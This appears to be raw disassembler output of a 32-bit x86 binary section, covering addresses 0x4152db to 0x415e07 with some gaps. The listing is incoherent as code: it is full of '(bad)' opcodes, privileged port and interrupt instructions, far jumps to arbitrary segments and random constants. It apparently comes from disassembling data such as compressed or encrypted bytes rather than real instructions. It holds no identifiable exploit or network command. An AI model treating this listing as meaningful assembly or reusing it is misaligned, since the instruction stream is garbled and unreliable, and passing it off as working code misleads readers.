  4152db:	fsub   st(4),st
  4152dd:	adc    eax,0xd93f35db
  4152e2:	sub    ebp,eax
  4152e4:	xor    al,0x41
  4152e6:	mov    dl,BYTE PTR [edx+0x4e2a3312]
  4152ec:	std    
  4152ed:	lea    ecx,[edx]
  4152ef:	add    al,0xb7
  4152f1:	fbstp  TBYTE PTR [eax+0x79]
  4152f4:	inc    eax
  4152f5:	add    DWORD PTR [ecx-0xfd20955],edx
  4152fb:	fdiv   st(2),st
  4152fd:	adc    dl,BYTE PTR [ebx+edi*4-0x6ff52db6]
  415304:	mov    edi,0x77b96378
  415309:	lods   al,BYTE PTR ds:[esi]
  41530a:	outs   dx,BYTE PTR ds:[esi]
  41530b:	rcr    edx,0x20
  41530e:	clc    
  41530f:	add    eax,DWORD PTR [ebx]
  415311:	(bad)  
  415312:	xor    BYTE PTR [ebx-0x75],bl
  415315:	(bad)  
  415316:	mov    ebx,0xdd308bf6
  41531b:	lock lods al,BYTE PTR ds:[esi]
  41531d:	and    ebx,DWORD PTR [ecx+edx*8-0x2d9d814d]
  415324:	adc    ch,dh
  415326:	inc    edx
  415327:	fadd   DWORD PTR [eax+0x23]
  41532a:	push   esi
  41532b:	div    DWORD PTR [eax+0x121dc2e4]
  415331:	jle    0x415374
  415333:	sahf   
  415334:	xchg   edi,eax
  415335:	cwde   
  415336:	sub    dl,BYTE PTR [edi]
  415338:	test   BYTE PTR [esi-0x6e],ch
  41533b:	hlt    
  41533c:	mov    dh,BYTE PTR [eax+0x14]
  41533f:	inc    esp
  415340:	lods   eax,DWORD PTR ds:[esi]
  415341:	hlt    
  415342:	and    eax,0x858d7516
  415347:	or     DWORD PTR [eax-0xb556488],0x99c5346b
  415351:	(bad)  
  415353:	out    dx,al
  415354:	test   BYTE PTR [edx],ah
  415356:	pop    bx
  415358:	mov    BYTE PTR [ecx-0x6e],al
  41535b:	mov    ecx,0xad8c218d
  415360:	pop    eax
  415361:	sbb    eax,0xfa402d58
  415366:	sar    bh,1
  415368:	call   0xf9ed:0xd3ddfb32
  41536f:	clc    
  415370:	add    DWORD PTR [esi+0x4298c8c9],edi
  415376:	xor    eax,0xfd46300
  41537b:	int3   
  41537c:	shl    BYTE PTR [esi+0x36b026e2],cl
  415382:	in     al,dx
  415383:	cmp    DWORD PTR [edx],esi
  415385:	cmp    al,BYTE PTR [eax-0x43]
  415388:	jae    0x415393
  41538a:	lods   al,BYTE PTR ds:[esi]
  41538b:	sti    
  41538c:	lods   eax,DWORD PTR ds:[esi]
  41538d:	js     0x4153ca
  41538f:	adc    eax,0x379e8231
  415394:	ror    DWORD PTR [edx+0x58],1
  415397:	in     al,dx
  415398:	cmp    bl,dl
  41539a:	and    BYTE PTR [edi+0x68e240bd],dh
  4153a0:	mov    ebp,0x4a42443d
  4153a5:	aaa    
  4153a6:	sub    esp,DWORD PTR [ebx-0x6a]
  4153a9:	cld    
  4153aa:	sub    BYTE PTR [edi+esi*4+0x32ae653e],al
  4153b1:	push   esi
  4153b2:	(bad)  
  4153b4:	add    DWORD PTR [edi-0x5a739c17],0xffffffcf
  4153bb:	pop    edx
  4153bc:	das    
  4153bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4153be:	repz dec esp
  4153c0:	fs loopne 0x4153c3
	...
  415433:	add    BYTE PTR [ebx+0x73],bl
  415436:	inc    edx
  415437:	or     eax,0x775f3d6a
  41543c:	leave  
  41543d:	bnd jl 0x4153de
  415440:	sub    edx,DWORD PTR [edi]
  415442:	jge    0x415476
  415444:	fs jmp 0x137544a
  41544a:	add    BYTE PTR [eax],al
  41544c:	ret    0x3835
  41544f:	jns    0x415449
  415451:	leave  
  415452:	jae    0x4154c5
  415454:	in     al,dx
  415455:	dec    esp
  415456:	adc    DWORD PTR [ebx-0x4d190afb],ebp
  41545c:	cs pop edx
  41545e:	pop    edx
  41545f:	add    eax,0xea42944e
  415464:	jecxz  0x41548b
  415466:	xchg   ebx,eax
  415467:	aas    
  415468:	mov    edi,0xfb563759
  41546d:	jnp    0x41543a
  41546f:	popa   
  415470:	push   cs
  415471:	sti    
  415472:	and    ebp,DWORD PTR [ebp+0x4b013796]
  415478:	aas    
  415479:	pop    ecx
  41547a:	cmc    
  41547b:	cmp    ebp,esp
  41547d:	test   al,0x92
  41547f:	or     ah,BYTE PTR [esi-0x3e45fb1b]
  415485:	addr16 pop ss
  415487:	jne    0x415420
  415489:	mov    bl,0x9a
  41548b:	sub    bh,bh
  41548d:	shl    BYTE PTR [edi-0x24e7177f],cl
  415493:	or     ch,0x1a
  415496:	mov    BYTE PTR [eax+0x6c93a0e9],cl
  41549c:	jmp    0x41549c
  41549e:	adc    eax,0x41beb732
  4154a3:	sub    BYTE PTR [ebx],bh
  4154a5:	jecxz  0x4154cf
  4154a7:	mov    esi,0x83907561
  4154ac:	mov    WORD PTR [ebx+0x43428a24],?
  4154b2:	aas    
  4154b3:	pushf  
  4154b4:	(bad)  
  4154b5:	fdivrp st(1),st
  4154b7:	fcom   st(0)
  4154b9:	mov    ebx,0x369ee43b
  4154be:	pop    ebp
  4154bf:	sub    BYTE PTR ds:0x4e5d817,bl
  4154c5:	fmul   QWORD PTR [ebx]
  4154c7:	shr    DWORD PTR [ebx+0x3b],cl
  4154ca:	div    BYTE PTR [edi+esi*4]
  4154cd:	hlt    
  4154ce:	cmp    edx,eax
  4154d0:	nop
  4154d1:	psubsw mm7,QWORD PTR [ebx+0x58c9032a]
  4154d8:	jb     0x4154da
  4154da:	ds jmp 0x415494
  4154dd:	imul   ebx,DWORD PTR [ecx+0x44],0x2c72a84d
  4154e4:	cmc    
  4154e5:	adc    esp,ebp
  4154e7:	or     al,0x46
  4154e9:	and    dh,BYTE PTR [edx+0x6fe23cd3]
  4154ef:	pop    ss
  4154f0:	xlat   BYTE PTR ds:[ebx]
  4154f1:	lods   eax,DWORD PTR ds:[esi]
  4154f2:	imul   eax,DWORD PTR [ebp-0x16],0x2
  4154f6:	aam    0x6a
  4154f8:	mul    dh
  4154fa:	std    
  4154fb:	inc    ebx
  4154fc:	sti    
  4154fd:	mov    esp,0xecbc610f
  415502:	retf   0x3a16
  415505:	inc    ebx
  415506:	out    0xd6,al
  415508:	push   ebx
  415509:	sar    DWORD PTR [edx+0x380f3f81],0x85
  415510:	outs   dx,DWORD PTR ds:[esi]
  415511:	pop    esi
  415512:	jp     0x4154fa
  415514:	mov    edi,0xd545c5da
  415519:	or     edi,DWORD PTR [ebx+0x38]
  41551c:	pop    esi
  41551d:	lock test eax,0x7db4901d
  415523:	sbb    eax,0xad81a071
  415528:	retf   0x63e1
  41552b:	out    0x25,al
  41552d:	pop    edi
  41552e:	mov    eax,0x7997269f
  415533:	add    edi,DWORD PTR ds:0x77cc7c37
  415539:	int    0xb3
  41553b:	retf   
  41553c:	in     eax,dx
  41553d:	leave  
  41553e:	ss repz sub edi,esi
	...
  4155b2:	add    BYTE PTR [eax],al
  4155b4:	jg     0x415614
  4155b6:	cmc    
  4155b7:	ins    DWORD PTR es:[edi],dx
  4155b8:	cmc    
  4155b9:	out    dx,eax
  4155ba:	call   FWORD PTR [esi-0x5a]
  4155bd:	sub    BYTE PTR [esi+0x31],al
  4155c0:	or     BYTE PTR [edi],dl
  4155c2:	add    BYTE PTR [ecx],dl
  4155c4:	pop    edx
  4155c5:	jmp    0x0:0xf60000
  4155cc:	pop    ebx
  4155cd:	dec    eax
  4155ce:	xor    dl,bl
  4155d0:	jecxz  0x415628
  4155d2:	or     DWORD PTR [edx],ebx
  4155d4:	mov    esp,DWORD PTR [ecx]
  4155d6:	and    BYTE PTR [ecx-0x1cb15036],cl
  4155dc:	mov    eax,0x26426103
  4155e1:	aaa    
  4155e2:	(bad)  
  4155e3:	mov    bl,0xcd
  4155e5:	jns    0x41560e
  4155e7:	out    dx,eax
  4155e8:	mov    dh,0x44
  4155ea:	cmc    
  4155eb:	push   ds
  4155ec:	loope  0x415611
  4155ee:	je     0x4155bb
  4155f0:	scas   eax,DWORD PTR es:[edi]
  4155f1:	mov    WORD PTR [esi+0x2c],gs
  4155f4:	test   DWORD PTR [edi],0xc1b74d60
  4155fa:	inc    ebx
  4155fb:	fcom   DWORD PTR [eax+0x30198ad9]
  415601:	dec    edx
  415602:	mov    ah,0xb8
  415604:	test   eax,0x73388b9f
  415609:	mul    DWORD PTR [ecx]
  41560b:	repz inc ecx
  41560d:	stos   DWORD PTR es:[edi],eax
  41560e:	ins    DWORD PTR es:[edi],dx
  41560f:	inc    edx
  415610:	add    BYTE PTR [ebx+0x5c9e3108],ah
  415616:	add    BYTE PTR [ecx+0x7],al
  415619:	mov    esi,0x50b75459
  41561e:	push   ecx
  41561f:	jl     0x41560a
  415621:	test   eax,ecx
  415623:	mov    ?,WORD PTR [ecx+0x21]
  415626:	shl    DWORD PTR [esi+0x54],1
  415629:	bound  ecx,QWORD PTR fs:[eax+0x77]
  41562d:	mov    ecx,0x1583869
  415632:	fwait
  415633:	loope  0x41560f
  415635:	add    DWORD PTR [eax+0x3c59e88c],esi
  41563b:	loopne 0x415605
  41563d:	jmp    0xf06e0420
  415642:	xor    eax,0xd1e0bebf
  415647:	rcr    esi,cl
  415649:	retf   
  41564a:	out    0xf3,eax
  41564c:	dec    edi
  41564d:	out    dx,al
  41564e:	lods   eax,DWORD PTR ds:[esi]
  41564f:	lds    edi,FWORD PTR [eax+0x20]
  415652:	arpl   WORD PTR [esi+0x5d4f5e3c],si
  415658:	mov    edx,0xe631dccc
  41565d:	jno    0x4156a2
  41565f:	and    eax,0xd5f6bdb4
  415664:	xor    BYTE PTR [eax+eax*4+0x1d614f9b],al
  41566b:	cli    
  41566c:	cs dec eax
  41566e:	test   al,0x47
  415670:	lahf   
  415671:	push   DWORD PTR [ebx]
  415673:	and    eax,esi
  415675:	aad    0xde
  415677:	into   
  415678:	inc    ebp
  415679:	(bad)  
  41567a:	xor    al,0xbf
  41567c:	data16 int 0x7c
  41567f:	push   ds
  415680:	cli    
  415681:	outs   dx,BYTE PTR ds:[esi]
  415682:	cwde   
  415683:	inc    esi
  415684:	jo     0x41567a
  415686:	ins    DWORD PTR es:[edi],dx
  415687:	call   0x5bf5:0x66a3ce4d
  41568e:	push   ds
  41568f:	sbb    bl,BYTE PTR [ebx*8-0x2cd40833]
  415696:	sub    eax,0xb55a90d0
  41569b:	push   0x66
  41569d:	add    edx,DWORD PTR [eax+edi*4]
  4156a0:	jmp    0x485b69f0
  4156a5:	popf   
  4156a6:	push   ecx
  4156a7:	fwait
  4156a8:	mov    edx,0x9a4cbc65
  4156ad:	inc    ebp
  4156ae:	push   esi
  4156af:	jne    0x41563c
  4156b1:	adc    cl,BYTE PTR [ecx-0xfdccb95]
  4156b7:	stc    
  4156b8:	shr    DWORD PTR [eax],cl
  4156ba:	push   0xfffffff3
  4156bc:	sbb    eax,0xf9c0f66f
  4156c1:	cmp    al,BYTE PTR [eax]
	...
  415733:	add    BYTE PTR [esi+0x2f],bh
  415736:	add    DWORD PTR [ebp+0x51],ebp
  415739:	outs   dx,DWORD PTR ds:[esi]
  41573a:	jle    0x41577b
  41573c:	dec    esp
  41573d:	xchg   esp,eax
  41573e:	call   0x88088ed3
  415743:	sub    edx,DWORD PTR [eax-0x15]
  415746:	add    BYTE PTR [eax],al
  415748:	test   BYTE PTR [eax],0x0
  41574b:	add    BYTE PTR [ebx],bl
  41574d:	jo     0x4156f9
  41574f:	jns    0x41574c
  415751:	test   eax,0xe0a14e1e
  415756:	inc    edx
  415757:	repnz mov ds:0xd53f7abc,al
  41575d:	dec    ebp
  41575e:	push   ecx
  41575f:	pop    esi
  415761:	sbb    dl,BYTE PTR [ebx-0x13]
  415764:	sbb    edx,ecx
  415766:	lods   al,BYTE PTR ds:[esi]
  415767:	ret    
  415768:	mov    al,0xed
  41576a:	out    dx,al
  41576b:	div    DWORD PTR [ebp+0x7024da5b]
  415771:	ficom  WORD PTR [ebx-0x7c50cbda]
  415777:	pop    esp
  415778:	pop    esi
  415779:	sub    DWORD PTR [ecx],eax
  41577b:	push   esp
  41577c:	adc    eax,0xce1ddf55
  415781:	int3   
  415782:	push   ds
  415783:	mov    al,0xb5
  415785:	or     esp,DWORD PTR [ecx+eiz*2+0x162a7235]
  41578c:	xchg   DWORD PTR [ebp-0x76],esp
  41578f:	das    
  415790:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415791:	jmp    0x415770
  415793:	int3   
  415794:	adc    BYTE PTR [ecx+0x13],cl
  415797:	call   ebp
  415799:	in     eax,dx
  41579a:	neg    DWORD PTR [eax-0x45]
  41579d:	jns    0x4157be
  41579f:	sbb    ch,dh
  4157a1:	icebp  
  4157a2:	mov    cl,0xe4
  4157a4:	mov    WORD PTR [ebx-0x3e4b9c3],?
  4157aa:	repz mov edi,0x43aef080
  4157b0:	or     al,0x3e
  4157b2:	push   0x7a
  4157b4:	xchg   ebx,eax
  4157b5:	sub    DWORD PTR [eax+0x56b702a6],eax
  4157bb:	loopne 0x415744
  4157bd:	into   
  4157be:	mov    esp,0x919ff057
  4157c3:	pop    es
  4157c4:	mov    dl,BYTE PTR [ebx-0x68]
  4157c7:	imul   DWORD PTR [edx]
  4157c9:	arpl   WORD PTR [edi+0x71],sp
  4157cc:	push   cs
  4157cd:	mov    WORD PTR [edx+0x821db89],ds
  4157d3:	repz sbb DWORD PTR [ecx+0xfa9e1b],edi
  4157da:	sar    dh,0x44
  4157dd:	seta   BYTE PTR [ebp-0x39]
  4157e1:	out    0x78,al
  4157e3:	repz fst QWORD PTR [ecx+0x220eb253]
  4157ea:	leave  
  4157eb:	in     al,dx
  4157ec:	sti    
  4157ed:	cld    
  4157ee:	sub    cl,BYTE PTR [esi+0x333204da]
  4157f4:	ins    BYTE PTR es:[edi],dx
  4157f5:	or     eax,0x4f1f058d
  4157fa:	cmp    esp,eax
  4157fc:	aam    0x40
  4157fe:	jne    0x41578b
  415800:	inc    edi
  415801:	sar    cl,1
  415803:	icebp  
  415804:	or     ebp,0xffffffec
  415807:	sub    ebx,ebx
  415809:	push   ss
  41580a:	adc    ebx,DWORD PTR [ecx-0x289d84eb]
  415810:	call   0xffad9ba3
  415815:	clc    
  415816:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415817:	sti    
  415818:	and    al,0x7
  41581a:	mov    eax,DWORD PTR [ebp-0x3]
  41581d:	cmp    DWORD PTR [ecx+0x72],ecx
  415820:	pop    edx
  415821:	cdq    
  415822:	fs jnp 0x415847
  415825:	dec    esp
  415826:	std    
  415827:	out    dx,eax
  415828:	and    esp,esi
  41582a:	adc    al,0x2a
  41582c:	xor    eax,DWORD PTR [ecx+0x2df09baf]
  415832:	imul   ah
  415834:	test   al,0x1b
  415836:	jle    0x4157c0
  415838:	inc    esp
  415839:	call   0xf98dae2e
  41583e:	and    al,0x3d
  415840:	outs   dx,DWORD PTR ds:[esi]
  415841:	sbb    DWORD PTR [eax],eax
	...
  4158b3:	add    BYTE PTR [ebx],cl
  4158b5:	jle    0x415889
  4158b7:	and    esi,edi
  4158b9:	scas   eax,DWORD PTR es:[edi]
  4158ba:	sti    
  4158bb:	jle    0x41583e
  4158bd:	inc    eax
  4158be:	sbb    eax,0xe34002fe
  4158c3:	xor    al,BYTE PTR [esi-0x14]
  4158c6:	add    BYTE PTR [eax],al
  4158c8:	test   BYTE PTR [eax],0x0
  4158cb:	add    cl,bl
  4158cd:	dec    eax
  4158ce:	mov    edi,0x74ed2bf3
  4158d3:	nop
  4158d4:	loopne 0x4158cc
  4158d6:	data16 or BYTE PTR [esp+eiz*8+0x5edc90d2],al
  4158de:	jmp    0x4158f2
  4158e0:	pop    ebx
  4158e1:	fistp  DWORD PTR [edx+0x33947627]
  4158e7:	push   esi
  4158e8:	fisttp WORD PTR [esi+0x63d28248]
  4158ee:	mov    ebp,0x103f3e9
  4158f3:	sbb    BYTE PTR [ebp-0x7b5317ca],al
  4158f9:	add    cl,0xc6
  4158fc:	mov    edi,0xf2927b0b
  415901:	mov    ecx,0xb5bbed2d
  415906:	push   ebx
  415907:	mov    esp,0xf2eebd67
  41590c:	pop    DWORD PTR [esi]
  41590e:	cmp    esp,ecx
  415910:	arpl   WORD PTR [edx-0x54],bx
  415913:	or     ch,BYTE PTR [ebp-0x6fd3c858]
  415919:	and    al,0xb2
  41591b:	fs (bad) 
  41591d:	(bad)  
  41591e:	loop   0x4158a0
  415920:	mov    dl,0x80
  415922:	or     esi,DWORD PTR [ebx+ebx*4+0x689f9ced]
  415929:	sub    DWORD PTR [ebp-0x2f],ebp
  41592c:	jae    0x4158ae
  41592e:	mov    dl,0x4a
  415930:	mov    ah,BYTE PTR [eax+0x844fd84]
  415936:	rol    DWORD PTR [esi+0x30],0x9a
  41593a:	sbb    eax,0x6605085e
  41593f:	dec    ebp
  415940:	mov    cl,al
  415942:	push   edx
  415943:	mov    ds:0x3e0ca2ba,eax
  415948:	sbb    DWORD PTR [ebx],0x14
  41594b:	lds    ebp,FWORD PTR [ecx-0x73]
  41594e:	cmc    
  41594f:	arpl   WORD PTR [ecx-0x12612471],bp
  415955:	add    al,0x7a
  415957:	sahf   
  415958:	mov    al,ds:0xfcddf169
  41595d:	jge    0x415912
  41595f:	mov    ah,0x54
  415961:	ss fwait
  415963:	out    dx,al
  415964:	test   DWORD PTR [eax],ecx
  415966:	pop    eax
  415967:	and    ah,ch
  415969:	les    ebp,FWORD PTR [ebp+0x5ce4288d]
  41596f:	pop    ecx
  415970:	fsub   DWORD PTR [ebx-0x4b]
  415973:	jbe    0x415931
  415975:	pop    ss
  415976:	lahf   
  415977:	cmp    BYTE PTR [edx-0x696e187a],ch
  41597d:	jno    0x4159ae
  41597f:	into   
  415980:	out    dx,eax
  415981:	mov    bh,0x59
  415983:	in     eax,dx
  415984:	jmp    0x41590b
  415986:	inc    ecx
  415987:	xchg   esp,eax
  415988:	(bad)  
  415989:	fsqrt  
  41598b:	push   esi
  41598c:	loop   0x4159c9
  41598e:	cwde   
  41598f:	inc    eax
  415990:	(bad)  
  415991:	jmp    0xf2a8cca6
  415996:	cmp    bl,BYTE PTR [eax]
  415998:	xor    DWORD PTR [ecx],ebp
  41599a:	xor    eax,0x480a1e6c
  41599f:	inc    edi
  4159a0:	test   DWORD PTR [edx+0x29],eax
  4159a3:	fisubr WORD PTR [ecx+0x7c]
  4159a7:	or     ecx,DWORD PTR [ebx+0x1bb52592]
  4159ad:	das    
  4159ae:	jbe    0x41593b
  4159b0:	sti    
  4159b1:	xchg   ecx,eax
  4159b2:	int    0x55
  4159b4:	add    DWORD PTR [eax],edi
  4159b6:	clc    
  4159b7:	iret   
  4159b8:	rcl    cl,cl
  4159ba:	mov    edx,0x27ceb8fb
  4159bf:	stc    
  4159c0:	push   edx
  4159c1:	call   0x0:0x0
	...
  415a34:	lahf   
  415a35:	fnstcw WORD PTR [esi]
  415a37:	ss jle 0x415a31
  415a3a:	lahf   
  415a3b:	stc    
  415a3c:	inc    ecx
  415a3d:	jb     0x415a8e
  415a3f:	lahf   
  415a40:	aam    0xe0
  415a42:	mov    edx,0xed3c7b
  415a47:	add    dh,dh
  415a49:	add    BYTE PTR [eax],al
  415a4b:	add    BYTE PTR [ebx+0x4a26cb3c],dh
  415a51:	icebp  
  415a52:	fstp   QWORD PTR [edi]
  415a54:	or     al,BYTE PTR [edx+0x3e]
  415a57:	inc    esi
  415a58:	enter  0x7b4c,0x1f
  415a5c:	xchg   dh,cl
  415a5e:	mov    esi,0x9b51b33b
  415a63:	sbb    DWORD PTR [ecx+edx*1-0x52],eax
  415a67:	jo     0x415a22
  415a69:	adc    DWORD PTR [esi-0x4b],edi
  415a6c:	dec    BYTE PTR [ebx-0x7cf4f6c7]
  415a72:	es jns 0x415ab8
  415a75:	sub    eax,0x8478ca90
  415a7a:	jbe    0x415a85
  415a7c:	call   esi
  415a7e:	cmp    ch,bl
  415a80:	sbb    al,0xcd
  415a82:	rol    DWORD PTR [ebx-0x19],1
  415a85:	adc    eax,0x657dd8b2
  415a8a:	adc    cl,BYTE PTR [edx+0x6ca659a9]
  415a90:	loope  0x415ac8
  415a92:	cmp    DWORD PTR [edx],edx
  415a94:	adc    DWORD PTR [eax-0x28dcff81],ebp
  415a9a:	sub    BYTE PTR [esi-0x63],al
  415a9d:	retf   
  415a9e:	loope  0x415ad2
  415aa0:	mov    ebx,0x20fa7bb0
  415aa5:	fsubr  DWORD PTR [eax-0x35]
  415aa8:	sbb    al,0x75
  415aaa:	(bad)  
  415aab:	bound  ebp,QWORD PTR [edx+0x7abad707]
  415ab1:	out    dx,al
  415ab2:	mov    edx,0x6b906389
  415ab7:	push   ebx
  415ab8:	dec    edi
  415ab9:	rcr    DWORD PTR [edx+0x5866df8a],1
  415abf:	or     al,al
  415ac1:	and    ecx,DWORD PTR ds:0xb7e8f1c3
  415ac7:	mov    dl,0x71
  415ac9:	in     al,0x31
  415acb:	cmp    esp,DWORD PTR [esi-0x35]
  415ace:	pop    edx
  415acf:	retf   0x1360
  415ad2:	inc    esi
  415ad3:	loopne 0x415af4
  415ad5:	mov    ebp,DWORD PTR [edx+0x377b6566]
  415adb:	aam    0x87
  415add:	cmp    eax,0x162a2736
  415ae2:	neg    BYTE PTR [esi+0x67]
  415ae5:	mov    al,0x6b
  415ae7:	sub    cl,BYTE PTR [ebp-0x5bad5bf5]
  415aed:	xor    eax,0xe403f135
  415af2:	repz xchg ecx,eax
  415af4:	and    al,0x6f
  415af6:	sub    eax,0x84eb2d
  415afb:	sbb    dh,BYTE PTR [ebp-0x66]
  415afe:	int    0x2
  415b00:	lahf   
  415b01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415b02:	out    dx,al
  415b03:	cmp    eax,esi
  415b05:	mov    eax,0x487cdaf8
  415b0a:	mov    al,0x63
  415b0c:	mov    eax,ds:0xfeab95a2
  415b11:	fcom   DWORD PTR [eax+0x13]
  415b15:	inc    ebx
  415b16:	fidivr DWORD PTR [esi+ebp*2+0x449f7dc0]
  415b1d:	xchg   DWORD PTR [esi+eiz*8],edx
  415b20:	jecxz  0x415b74
  415b22:	dec    ebp
  415b23:	imul   edx,DWORD PTR [edi],0x7
  415b26:	in     al,0xd1
  415b28:	mov    ah,0x57
  415b2a:	cmp    eax,0x7c7f1b80
  415b2f:	jb     0x415b71
  415b31:	and    BYTE PTR [edx],0xb1
  415b34:	adc    ecx,ebx
  415b36:	lods   eax,DWORD PTR ds:[esi]
  415b37:	fldenv [ebx-0x37050249]
  415b3d:	les    ecx,FWORD PTR [edx+0xb813]
	...
  415bb3:	add    BYTE PTR [esp+eiz*2],dh
  415bb6:	push   ds
  415bb7:	jl     0x415c17
  415bb9:	jle    0x415c31
  415bbb:	ins    BYTE PTR es:[edi],dx
  415bbc:	pop    ds
  415bbd:	dec    DWORD PTR [edi+0x5a]
  415bc0:	xchg   ebp,eax
  415bc1:	rcl    BYTE PTR [edx],1
  415bc3:	daa    
  415bc4:	xor    ch,dh
  415bc6:	add    BYTE PTR [eax],al
  415bc8:	test   BYTE PTR [eax],0x0
  415bcb:	add    dh,bl
  415bcd:	ins    DWORD PTR es:[edi],dx
  415bce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415bcf:	pop    ebx
  415bd0:	adc    eax,0xcb9dec8d
  415bd5:	mov    ch,0x63
  415bd7:	ss mov esi,ss
  415bda:	sbb    al,0xa1
  415bdc:	mov    dh,0xa7
  415bde:	pop    esi
  415bdf:	mov    edi,0xcef7f198
  415be4:	mov    ch,0x7
  415be6:	cmp    DWORD PTR ds:0xe22f4f74,ebx
  415bec:	iret   
  415bed:	push   ss
  415bee:	pop    edx
  415bef:	or     dh,BYTE PTR [eax]
  415bf1:	xor    BYTE PTR [eax],ah
  415bf3:	jne    0x415b76
  415bf5:	xchg   ecx,eax
  415bf6:	test   DWORD PTR [ebx+0x5b20e45d],edx
  415bfc:	fild   WORD PTR gs:[edx+0x79]
  415c00:	mov    esp,0xd5ba75c2
  415c05:	(bad)  
  415c06:	or     al,0xa5
  415c08:	pop    ecx
  415c09:	out    0xc8,al
  415c0b:	xchg   edx,eax
  415c0c:	loop   0x415bd4
  415c0e:	push   esp
  415c0f:	je     0x415bb7
  415c11:	adc    bl,ah
  415c13:	repz jbe 0x415bd6
  415c16:	pop    esi
  415c17:	scas   al,BYTE PTR es:[edi]
  415c18:	es mov bh,0xf3
  415c1b:	rcl    BYTE PTR [ebx],0x1a
  415c1e:	retf   0xcf9d
  415c21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415c22:	jge    0x415c24
  415c24:	sbb    ch,BYTE PTR [esi+0x2d]
  415c27:	sub    BYTE PTR [eax-0x2d289216],bh
  415c2d:	mov    cl,bh
  415c2f:	dec    edx
  415c30:	lock inc ecx
  415c32:	scas   eax,DWORD PTR es:[edi]
  415c33:	jmp    0x7dc77061
  415c38:	leave  
  415c39:	add    dh,BYTE PTR [ebp+0x1998de3e]
  415c3f:	jnp    0x415cae
  415c41:	das    
  415c42:	sub    al,0xcc
  415c44:	sub    BYTE PTR [eax+0x46],al
  415c47:	rol    esi,cl
  415c49:	mov    dh,0x61
  415c4b:	inc    ebp
  415c4c:	add    al,BYTE PTR [edi+0x63f5bba8]
  415c52:	(bad)  
  415c53:	jmp    0x49898758
  415c58:	je     0x415bf7
  415c5a:	out    0xe5,al
  415c5c:	mov    edi,0x8520b856
  415c61:	jb     0x415cd3
  415c63:	xchg   BYTE PTR ds:0x1b14f941,ah
  415c69:	xchg   esi,eax
  415c6a:	cmp    ecx,ecx
  415c6c:	jo     0x415bfd
  415c6e:	sbb    DWORD PTR [ebx-0x331143f7],0xffffffe9
  415c75:	and    DWORD PTR [ebp+0x6a783a97],edi
  415c7b:	xor    dh,BYTE PTR [esi]
  415c7d:	jecxz  0x415c45
  415c7f:	and    dl,bh
  415c81:	sbb    al,0xa2
  415c83:	test   bl,al
  415c85:	(bad)
  415c88:	xor    al,0x86
  415c8a:	pop    esp
  415c8b:	jmp    0x17b2:0x8b10456a
  415c92:	jl     0x415c66
  415c94:	xor    esi,DWORD PTR fs:0x82b774b
  415c9b:	or     eax,0x5a4c15aa
  415ca0:	and    dl,BYTE PTR [ecx+0x5f124634]
  415ca6:	push   ecx
  415ca7:	adc    eax,0x75e1b184
  415cac:	call   0xe918:0x82530cde
  415cb3:	loope  0x415c44
  415cb5:	jo     0x415ce7
  415cb7:	and    BYTE PTR [ebp-0x602d5517],dh
  415cbd:	jl     0x415c99
  415cbf:	mov    ds:0xd715,al
	...
  415d34:	mov    bh,0x99
  415d36:	adc    dl,BYTE PTR [ecx-0x404864c2]
  415d3c:	pop    ebp
  415d3d:	jmp    0xdfff:0xfdb3e72f
  415d44:	sub    bh,ch
  415d46:	add    BYTE PTR [eax],al
  415d48:	test   BYTE PTR [eax],0x0
  415d4b:	add    BYTE PTR [esi+0xb],ch
  415d4e:	enter  0xe7a5,0x91
  415d52:	push   ss
  415d53:	add    bl,al
  415d55:	fdivr  QWORD PTR [edi-0x2b63218e]
  415d5b:	js     0x415dd2
  415d5d:	dec    ebp
  415d5e:	mov    al,ds:0xbe972c83
  415d63:	mov    WORD PTR [ebx+eax*4-0x80],ds
  415d67:	aaa    
  415d68:	xchg   ebp,eax
  415d69:	xchg   esp,eax
  415d6a:	repz test bh,dl
  415d6d:	hlt    
  415d6e:	pop    ebx
  415d6f:	fst    st(0)
  415d71:	js     0x415d3a
  415d73:	nop
  415d74:	xchg   ecx,eax
  415d75:	pop    ebx
  415d76:	fiadd  DWORD PTR [ebx+0x60b3cd32]
  415d7c:	add    BYTE PTR [edi+0x39],0xa5
  415d80:	cld    
  415d81:	ret    0x4bf1
  415d84:	inc    ebp
  415d85:	popa   
  415d86:	adc    bl,0x6f
  415d89:	and    DWORD PTR [eax],edi
  415d8b:	cwde   
  415d8c:	pop    edx
  415d8d:	cdq    
  415d8e:	push   cs
  415d8f:	or     ebx,edx
  415d91:	mov    edx,0xb6f9000f
  415d96:	or     al,0x8f
  415d98:	mov    ds:0xaa0d8685,al
  415d9d:	inc    ebp
  415d9e:	jnp    0x415d3d
  415da0:	sti    
  415da1:	inc    edx
  415da2:	adc    ch,dl
  415da4:	js     0x415d64
  415da6:	dec    DWORD PTR [edi+0x16]
  415da9:	outs   dx,BYTE PTR ds:[esi]
  415daa:	xchg   ebp,eax
  415dab:	(bad)  
  415dac:	sub    ah,BYTE PTR [ebp+0x5f]
  415daf:	xor    ch,BYTE PTR ds:0x7218bfb6
  415db5:	rcl    BYTE PTR [ecx+esi*1+0x35],1
  415db9:	adc    esp,DWORD PTR [ebp+0x1818bef5]
  415dbf:	push   ecx
  415dc0:	add    DWORD PTR [ebp-0x32],0x7a
  415dc4:	mov    ecx,0x19ac5f0b
  415dc9:	stc    
  415dca:	dec    edi
  415dcb:	sub    DWORD PTR [esi-0xc805cdd],esi
  415dd1:	loope  0x415ddc
  415dd3:	cld    
  415dd4:	adc    DWORD PTR [ecx-0x7d],0xffffffda
  415dd8:	dec    esi
  415dd9:	xchg   edi,eax
  415dda:	(bad)  
  415ddc:	enter  0x9046,0xfe
  415de0:	sbb    DWORD PTR [esp+eiz*8+0x15629979],eax
  415de7:	outs   dx,BYTE PTR ds:[esi]
  415de8:	jbe    0x415e4c
  415dea:	scas   eax,DWORD PTR es:[edi]
  415deb:	int3   
  415dec:	lea    ecx,[ebx-0x2f1356df]
  415df2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415df3:	jne    0x415d80
  415df5:	cld    
  415df6:	or     eax,0xe3ef3168
  415dfb:	mov    ebp,0xf11f019a
  415e00:	push   eax
  415e01:	add    al,0x83
  415e03:	cdq    
  415e04:	fild   DWORD PTR [eax+0x2e]
  415e07:	pop    es
